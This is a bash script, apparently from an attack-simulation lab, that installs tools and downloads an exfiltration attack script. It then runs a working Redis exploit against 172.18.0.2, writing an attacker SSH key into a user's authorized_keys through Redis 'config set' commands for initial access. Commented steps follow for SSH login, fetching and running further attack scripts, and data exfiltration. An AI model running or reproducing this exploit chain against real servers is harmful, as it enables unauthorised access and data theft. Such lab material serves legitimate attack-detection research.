#!/bin/bash

echo "Installing dependencies..."
#
sudo apt update -y
sudo apt install build-essential -y
sudo apt install curl -y
sudo apt-get -y install net-tools
sudo apt-get install -y iputils-ping
sudo apt-get -y install software-properties-common
sudo apt install -y less
sudo apt install -y unzip
sudo apt install -y nano
sudo apt install iproute2 -y
sudo apt -y install make gcc
sudo apt install redis -y
sudo apt install nmap -y

cd ~ && wget https://github.com/S692/ossas/blob/main/attackScripts/exfiltration_attk.sh && chmod +x exfiltration_attk.sh

# [Initial access] Automated
cd ~
mkdir .ssh
ssh-keygen -t rsa -f /root/.ssh/id_rsa -N ""
cd .ssh
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > 1.txt
cat 1.txt | redis-cli -h 172.18.0.2 -x set sshkey
printf "keys *\nconfig set dir /home/resch/.ssh\nconfig set dbfilename 'authorized_keys'\nsave\nexit" | redis-cli -h 172.18.0.2

# [Initial acccess] Reverse Shell
# ssh -i ~/.ssh/id_rsa resch@172.18.0.2

# [Initial access] Setup download scripts
# Will be in /home/resch on the target
# wget https://github.com/S692/ossas/blob/main/attack_scripts_download.sh && chmod +x attack_scripts_download.sh
# ./attack_scripts_download.sh

# [Exfiltration] Open another terminal and run as root:
# ~/exfiltration.sh
